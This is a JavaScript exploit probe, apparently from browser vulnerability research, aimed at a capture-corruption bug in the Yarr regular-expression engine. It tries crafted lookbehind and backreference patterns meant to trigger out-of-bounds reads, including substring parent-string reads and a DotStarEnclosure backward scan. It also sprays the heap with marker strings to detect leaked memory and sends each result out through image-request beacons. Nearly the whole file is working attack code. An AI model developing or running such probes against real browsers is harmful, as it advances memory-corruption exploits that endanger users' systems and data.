// p236 — Yarr C3: can corrupted captures escape the lookbehind?
// Core insight: if lookbehind SUCCEEDS despite corruption,
// capture positions stored in output[] have corrupted values.
// A backreference OUTSIDE the lookbehind uses output[] → reread(corrupted) → OOB.
//
// Three paths to success-with-corruption:
// 1. Non-BMP capture (\u{10000}) avoids the BMP tryReadBackward path entirely
// 2. Zero-min quantifier (\1{0,}) — 0 matches is ok, but corruption from failed attempt persists
// 3. Alternation — corrupt branch fails, clean branch succeeds

(function() {
  var B = "V236-";
  function beacon(tag) {
    try { new Image().src = "/BEACON?" + B + tag + "&t=" + Date.now(); } catch(e) {}
  }

  function hexCP(s) {
    if (s === undefined) return "undef";
    if (s === null) return "null";
    if (typeof s === "number") return "n" + s;
    var r = [];
    for (var i = 0; i < s.length && i < 30; i++)
      r.push(s.charCodeAt(i).toString(16).padStart(4, "0"));
    return r.join("-") || "empty";
  }

  function reportExec(tag, m) {
    if (m === null) { beacon(tag + "-NULL"); return; }
    beacon(tag + "-HIT-idx" + m.index + "-m0" + hexCP(m[0]));
    for (var i = 1; i < m.length && i <= 5; i++)
      beacon(tag + "-C" + i + "-" + hexCP(m[i]));
  }

  function reportReplace(tag, input, re) {
    var caps = [];
    var out = input.replace(re, function() {
      for (var i = 0; i < arguments.length; i++) {
        var v = arguments[i];
        if (typeof v === "string") caps.push(i + "S" + hexCP(v));
        else caps.push(i + "N" + v);
      }
      return "X";
    });
    if (caps.length > 0) {
      beacon(tag + "-FIRE-" + caps.length);
      for (var ci = 0; ci < caps.length && ci < 8; ci++)
        beacon(tag + "-A" + caps[ci]);
    } else {
      beacon(tag + "-NOFIRE");
    }
  }

  beacon("START");

  // === PATH 1: Non-BMP capture avoids corruption ===
  // /(?<=(\u{10000})\1*(a))b/u — group 1 captures the surrogate pair.
  // \1* backrefs a non-BMP char → readSurrogatePairChecked, NO rewind side effect.
  // Should SUCCEED without corruption. Captures should be clean.
  // This is our BASELINE — proves lookbehind can succeed.

  // A: exec
  try {
    reportExec("A", /(?<=(\u{10000})\1*(a))b/u.exec("\u{10000}ab"));
  } catch(e) { beacon("A-ERR-" + e.message.slice(0,40)); }

  // B: replace callback for detailed capture inspection
  try {
    reportReplace("B", "\u{10000}ab", /(?<=(\u{10000})\1*(a))b/u);
  } catch(e) { beacon("B-ERR-" + e.message.slice(0,40)); }

  // === PATH 2: BMP capture with zero-min backref ===
  // /(?<=\u{10000}\1{0,}(a))b/u
  // \1{0,} is greedy: tries, fails once (corrupting pos by -1), stops at 0 matches.
  // Remaining terms match at corrupted position.
  // Question: does the lookbehind still succeed with pos off by 1?

  // C: zero-min, basic
  try {
    reportExec("C", /(?<=\u{10000}\1{0,}(a))b/u.exec("\u{10000}ab"));
  } catch(e) { beacon("C-ERR-" + e.message.slice(0,40)); }

  // D: zero-min, replace
  try {
    reportReplace("D", "\u{10000}ab", /(?<=\u{10000}\1{0,}(a))b/u);
  } catch(e) { beacon("D-ERR-" + e.message.slice(0,40)); }

  // === PATH 3: Capture at corrupted pos, backref OUTSIDE lookbehind ===
  // This is the OOB path. If lookbehind succeeds with corrupted capture,
  // \2 outside reads from corrupted position via reread().

  // E: two captures in lookbehind, backreference to second outside
  try {
    reportExec("E", /(?<=(\u{10000})\1*(a))(.)(\2)/u.exec("\u{10000}aba"));
  } catch(e) { beacon("E-ERR-" + e.message.slice(0,40)); }

  // F: replace version of E
  try {
    reportReplace("F", "\u{10000}aba", /(?<=(\u{10000})\1*(a))(.)(\2)/u);
  } catch(e) { beacon("F-ERR-" + e.message.slice(0,40)); }

  // === PATH 4: Alternation — corrupt branch fails, clean branch succeeds ===
  // /(?<=\u{10000}\1*(a)|(.{1,5}))b/u
  // First alternative triggers corruption and fails.
  // Engine backtracks to second alternative which succeeds cleanly.
  // But does the failed first alternative leave any captures in output[]?

  // G: alternation
  try {
    reportExec("G", /(?<=\u{10000}\1*(a)|(.{1,5}))b/u.exec("\u{10000}ab"));
  } catch(e) { beacon("G-ERR-" + e.message.slice(0,40)); }

  // H: alternation replace
  try {
    reportReplace("H", "\u{10000}ab", /(?<=\u{10000}\1*(a)|(.{1,5}))b/u);
  } catch(e) { beacon("H-ERR-" + e.message.slice(0,40)); }

  // === PATH 5: Nested lookbehind ===
  // Inner lookbehind triggers corruption, outer continues with corrupted pos

  // I: nested
  try {
    reportExec("I", /(?<=(?<=\u{10000}\1*(a))(.).)b/u.exec("\u{10000}abb"));
  } catch(e) { beacon("I-ERR-" + e.message.slice(0,40)); }

  // === PATH 6: Forward capture then lookbehind reads it ===
  // (a) captures first, then lookbehind triggers on what follows

  // J: forward then lookbehind
  try {
    reportExec("J", /(a)(?<=\u{10000}\2*(a))(.)/u.exec("\u{10000}ab"));
  } catch(e) { beacon("J-ERR-" + e.message.slice(0,40)); }

  // === PATH 7: Substring sharing — corrupted pos reads PARENT string ===
  // If regex input is a substring view, reread() at corrupted offset
  // might read from parent string's data (before the substring start)

  // K: substring test
  try {
    var parent = "DEADBEEF" + "\u{10000}" + "ab";
    var sub = parent.substring(8); // starts at \u{10000}
    reportExec("K", /(?<=(\u{10000})\1*(a))b/u.exec(sub));
  } catch(e) { beacon("K-ERR-" + e.message.slice(0,40)); }

  // L: substring with replace to inspect captures
  try {
    var parent2 = "DEADBEEF" + "\u{10000}" + "ab";
    var sub2 = parent2.substring(8);
    reportReplace("L", sub2, /(?<=(\u{10000})\1*(a))b/u);
  } catch(e) { beacon("L-ERR-" + e.message.slice(0,40)); }

  // === PATH 8: DotStarEnclosure path ===
  // /^.*(?<=\u{10000}\1*(a))b.*$/u triggers DotStarEnclosure optimization
  // which uses reread(matchBegin) in a backward scan loop.
  // If matchBegin is corrupted, the loop reads OOB backward.

  // M: DotStarEnclosure
  try {
    reportExec("M", /^.*(?<=\u{10000}\1*(a))b.*$/u.exec("\u{10000}ab"));
  } catch(e) { beacon("M-ERR-" + e.message.slice(0,40)); }

  // === PATH 9: Multiple corruptions compound ===
  // Chain backreferences: each one corrupts position by -1
  // /(?<=\u{10000}\1*(a)\2*(b)\3*(c))d/u
  // \1* corrupts by -1, \2* corrupts by -1, \3* corrupts by -1 → total -3

  // N: chained corruption
  try {
    reportExec("N", /(?<=\u{10000}\1*(a)\2*(b)\3*(c))d/u.exec("\u{10000}abcd"));
  } catch(e) { beacon("N-ERR-" + e.message.slice(0,40)); }

  // === PATH 10: hasIndices — get exact capture positions ===
  // With /d flag, exec returns indices array with [start, end] for each group.
  // If captures have corrupted positions, indices will show the corruption directly.

  // O: hasIndices flag
  try {
    var re = /(?<=(\u{10000})\1*(a))b/ud;
    var m = re.exec("\u{10000}ab");
    if (m && m.indices) {
      beacon("O-HIT");
      for (var i = 0; i < m.indices.length && i <= 3; i++) {
        var idx = m.indices[i];
        if (idx) beacon("O-I" + i + "-" + idx[0] + "to" + idx[1]);
        else beacon("O-I" + i + "-undef");
      }
    } else if (m) {
      beacon("O-NOIDX");
    } else {
      beacon("O-NULL");
    }
  } catch(e) { beacon("O-ERR-" + e.message.slice(0,40)); }

  // P: hasIndices with BMP corruption pattern
  try {
    var re2 = /(?<=\u{10000}\1{0,}(a))b/ud;
    var m2 = re2.exec("\u{10000}ab");
    if (m2 && m2.indices) {
      beacon("P-HIT");
      for (var i = 0; i < m2.indices.length && i <= 3; i++) {
        var idx = m2.indices[i];
        if (idx) beacon("P-I" + i + "-" + idx[0] + "to" + idx[1]);
        else beacon("P-I" + i + "-undef");
      }
    } else if (m2) {
      beacon("P-NOIDX");
    } else {
      beacon("P-NULL");
    }
  } catch(e) { beacon("P-ERR-" + e.message.slice(0,40)); }

  // Q: hasIndices with the original C3 corruption trigger
  try {
    var re3 = /(?<=\u{10000}\1*(a))b/ud;
    var m3 = re3.exec("\u{10000}ab");
    if (m3 && m3.indices) {
      beacon("Q-HIT");
      for (var i = 0; i < m3.indices.length; i++) {
        var idx = m3.indices[i];
        if (idx) beacon("Q-I" + i + "-" + idx[0] + "to" + idx[1]);
        else beacon("Q-I" + i + "-undef");
      }
    } else if (m3) {
      beacon("Q-NOIDX");
    } else {
      beacon("Q-NULL");
    }
  } catch(e) { beacon("Q-ERR-" + e.message.slice(0,40)); }

  // === SPRAY TEST: Put known data adjacent, check if captures contain it ===
  // R: heap spray then C3 pattern on substring
  try {
    var spray = [];
    for (var i = 0; i < 500; i++)
      spray.push("LEAKLEAK".repeat(32));
    var inp = "\u{10000}ab";
    var m = /(?<=(\u{10000})\1*(a))b/u.exec(inp);
    if (m) {
      for (var ci = 0; ci <= 2; ci++) {
        var c = m[ci];
        if (c !== undefined) {
          for (var j = 0; j < c.length; j++) {
            var cc = c.charCodeAt(j);
            if (cc === 0x4C || cc === 0x45 || cc === 0x41 || cc === 0x4B) {
              beacon("R-LEAK-g" + ci + "p" + j + "-" + cc.toString(16));
            }
          }
        }
      }
      beacon("R-MATCH-noleak");
    } else {
      beacon("R-NULL");
    }
    spray = null;
  } catch(e) { beacon("R-ERR-" + e.message.slice(0,40)); }

  beacon("DONE");
})();
